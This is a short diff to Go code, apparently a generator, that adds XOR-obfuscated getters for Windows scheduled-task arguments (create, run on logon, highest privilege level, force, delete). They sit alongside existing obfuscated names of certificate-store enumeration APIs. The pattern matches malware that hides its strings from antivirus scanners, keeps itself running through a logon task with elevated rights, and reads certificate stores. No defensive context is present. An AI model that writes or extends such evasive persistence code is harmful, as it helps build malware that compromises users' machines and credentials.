@@ -503,5 +503,16 @@ func getCertEnumCertsName() string        { return string(xor(encCertEnumCertsNa
 func getCertGetNameStringWName() string   { return string(xor(encCertGetNameStringWName, decryptionKey)) }
 func getCertFreeCertCtxName() string      { return string(xor(encCertFreeCertCtxName, decryptionKey)) }
 func getCertCloseStoreName() string       { return string(xor(encCertCloseStoreName, decryptionKey)) }
+
+func getSchtasksCreate() string { return string(xor(encSchtasksCreate, decryptionKey)) }
+func getSchtasksTn() string     { return string(xor(encSchtasksTn, decryptionKey)) }
+func getSchtasksTr() string     { return string(xor(encSchtasksTr, decryptionKey)) }
+func getSchtasksSc() string     { return string(xor(encSchtasksSc, decryptionKey)) }
+func getSchtasksOnLogon() string { return string(xor(encSchtasksOnLogon, decryptionKey)) }
+func getSchtasksRl() string     { return string(xor(encSchtasksRl, decryptionKey)) }
+func getSchtasksHighest() string { return string(xor(encSchtasksHighest, decryptionKey)) }
+func getSchtasksF() string      { return string(xor(encSchtasksF, decryptionKey)) }
+func getSchtasksDelete() string { return string(xor(encSchtasksDelete, decryptionKey)) }
+
 `)
 }
